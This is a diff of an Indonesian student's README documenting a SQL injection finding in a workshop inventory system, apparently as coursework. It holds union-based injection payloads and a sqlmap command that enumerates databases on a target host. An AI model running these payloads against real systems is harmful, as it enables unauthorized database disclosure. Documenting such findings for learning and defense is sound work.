@@ -2,40 +2,40 @@
 
 **Nama:** Haris Adriansyah  
 **NIM:** 312410286  
-**Kelas:** TI.24.A.1 (I.12.1D)  
+**Kelas:** TI.24.A.1  
 **Matkul:** Pemrograman Web  
 **Dosen:** Agung Nugroho, S.Kom., M.Kom.
 
 ![Security](https://img.shields.io/badge/Security-Penetration%20Testing-red)
 ![License](https://img.shields.io/badge/License-MIT-blue)
 
-Repository ini berisi dokumentasi teknis mengenai temuan kerentanan **SQL Injection (SQLi)** pada Sistem Manajemen Inventaris Bengkel Jaya. Dokumentasi ini bertujuan sebagai referensi pembelajaran bagi developer dan praktisi keamanan siber.
+Repository ini berisi dokumentasi teknis mengenai temuan kerentanan **SQL Injection (SQLi)** pada Sistem Manajemen Inventaris Bengkel Jaya.
 
 ---
 
 ## 📝 Deskripsi Proyek
-Sistem Manajemen Inventaris ini ditemukan memiliki celah keamanan kritis pada parameter input yang tidak difilter. Hal ini memungkinkan penyerang untuk mengeksekusi perintah SQL berbahaya, mencuri data pengguna, hingga mengambil alih hak akses administrator.
+Sistem ini memiliki celah keamanan pada parameter input yang tidak difilter, memungkinkan eksekusi perintah SQL berbahaya.
 
 ## 🔍 Temuan Kerentanan
-- **Vulnerability Type**: SQL Injection (Union Based & Error Based)
-- **Affected Component**: Parameter `id` pada `detail_barang.php` dan form login.
-- **Impact**: Full Database Disclosure (Data Leakage).
+- **Vulnerability Type**: SQL Injection (Union Based)
+- **Affected Component**: Parameter `id` pada `detail_barang.php`.
+- **Impact**: Database Disclosure.
 
 ---
 
 ## 🚀 Proof of Concept (PoC)
 
-### 1. Manual Injection (Union Based)
-Langkah awal dilakukan dengan menambahkan karakter kutip tunggal (`'`) untuk memicu error, kemudian menggunakan `ORDER BY` untuk menentukan jumlah kolom.
+### 1. Manual Injection
+Langkah awal untuk menentukan jumlah kolom dan ekstraksi data dasar.
 
-* **Payload untuk cek kolom:** `' ORDER BY 5-- -`
-* **Payload untuk ekstraksi data:** `' UNION SELECT 1,2,database(),user(),5-- -`
+* **Cek Kolom:** `' ORDER BY 5-- -`
+* **Ekstraksi Data:** `' UNION SELECT 1,2,database(),user(),5-- -`
 
 ![Manual Injection](img/hasil-manual.png)
 
 ### 2. Automated with SQLMap
-Setelah celah terverifikasi secara manual, dilakukan eksploitasi otomatis menggunakan **SQLMap** untuk efisiensi ekstraksi data secara menyeluruh.
+Penggunaan alat otomatis untuk efisiensi ekstraksi data database secara menyeluruh.
 
 **A. Enumerasi Database:**
 ```text
-sqlmap -u "[http://target-bengkel.com/detail.php?id=1](http://target-bengkel.com/detail.php?id=1)" --batch --dbs
+sqlmap -u [http://target-bengkel.com/detail.php?id=1](http://target-bengkel.com/detail.php?id=1) --batch --dbs
